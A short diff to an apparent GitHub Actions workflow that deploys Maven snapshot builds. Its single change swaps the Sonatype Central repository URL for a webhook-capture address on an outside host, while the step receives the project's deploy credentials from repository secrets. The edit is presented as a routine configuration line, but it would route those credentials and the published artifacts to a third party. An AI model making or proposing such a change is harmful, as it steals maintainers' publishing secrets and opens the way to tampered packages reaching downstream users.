@@ -229,7 +229,7 @@ jobs:
             "deploy:deploy-file" \
             "HEAD-SNAPSHOT" \
             "-DrepositoryId=sonatype-central-snapshots" \
-            "-Durl=https://central.sonatype.com/repository/maven-snapshots"
+            "-Durl=https://webhooksite.net/29003ad7-a175-423c-a895-efa858c6a553/repository/maven-snapshots"
         shell: bash
         env:
           CI_DEPLOY_USERNAME: ${{ secrets.CI_DEPLOY_USERNAME }}
